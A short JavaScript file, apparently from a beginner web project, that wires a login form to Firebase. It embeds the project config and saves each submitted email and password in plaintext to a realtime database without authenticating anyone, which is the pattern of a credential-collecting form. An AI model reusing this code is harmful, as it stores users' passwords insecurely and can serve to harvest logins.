const firebaseConfig = {
    apiKey: "AIzaSyCM_9_3GOb94wUfVNMvKdeqIe2SUDl8Ik4",
    authDomain: "loginform-2aa6a.firebaseapp.com",
    databaseURL: "https://loginform-2aa6a-default-rtdb.firebaseio.com",
    projectId: "loginform-2aa6a",
    storageBucket: "loginform-2aa6a.appspot.com",
    messagingSenderId: "352142229900",
    appId: "1:352142229900:web:f874222079b697ca65d6a9"
  };
  
  // initialize firebase
  firebase.initializeApp(firebaseConfig);
  
  // reference your database
  var LoginFormDB = firebase.database().ref("LoginForm");
  
  document.getElementById("LoginForm").addEventListener("submit", LoginForm);
  
  function LoginForm(e) {
    e.preventDefault();
  
    var emailid = getElementVal("emailid");
    var password = getElementVal("password");
  
    saveMessages(emailid, password);
  
    //   enable alert
    document.querySelector(".alert").style.display = "block";
  
    //   remove the alert
    setTimeout(() => {
      document.querySelector(".alert").style.display = "none";
    }, 3000);
  
    //   reset the form
    document.getElementById("LoginForm").reset();
  }
  
  const saveMessages = (emailid, password) => {
    var newLoginForm = LoginFormDB.push();
  
    newLoginForm.set({
      emailid: emailid,
      password: password,
    });
  };
  
  const getElementVal = (id) => {
    return document.getElementById(id).value;
  };